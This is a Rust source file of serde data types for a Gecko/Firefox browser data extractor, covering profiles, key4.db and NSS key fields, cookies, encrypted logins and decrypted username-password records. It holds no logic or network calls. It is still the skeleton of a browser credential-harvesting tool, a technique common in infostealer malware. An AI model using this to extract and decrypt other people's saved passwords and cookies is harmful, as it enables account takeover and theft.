use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserApplication {
    pub name: String,
    pub author: String,
    pub channel: String,
    pub path: std::path::PathBuf,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserProfile {
    pub name: String,
    pub path: String,
    pub last_used: String,
    pub browser_info: BrowserApplication,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Key4MetaData {
    pub item1: Vec<u8>,
    pub item2: Vec<u8>,
}

impl Key4MetaData {
    pub fn new(item1: Vec<u8>, item2: Vec<u8>) -> Self {
        Self { item1, item2 }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Key4NssPrivate {
    pub nss_a11: Vec<u8>,
    pub nss_a102: Vec<u8>,
}

impl Key4NssPrivate {
    pub fn new(nss_a11: Vec<u8>, nss_a102: Vec<u8>) -> Self {
        Self { nss_a11, nss_a102 }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeckoCookie {
    pub host: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expiry: i64,
    pub is_secure: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeckoLogin {
    pub hostname: String,
    #[serde(rename = "encryptedUsername")]
    pub encrypted_username: String,
    #[serde(rename = "encryptedPassword")]
    pub encrypted_password: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeckoAccount {
    pub logins: Vec<GeckoLogin>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecryptedGeckoAccount {
    pub website: String,
    pub username: String,
    pub password: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeckoProfileData {
    pub profile_info: BrowserProfile,
    pub cookies: Vec<GeckoCookie>,
    pub accounts: Vec<DecryptedGeckoAccount>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeckoExtractorData {
    pub app_info: BrowserApplication,
    pub profiles: Vec<GeckoProfileData>,
}
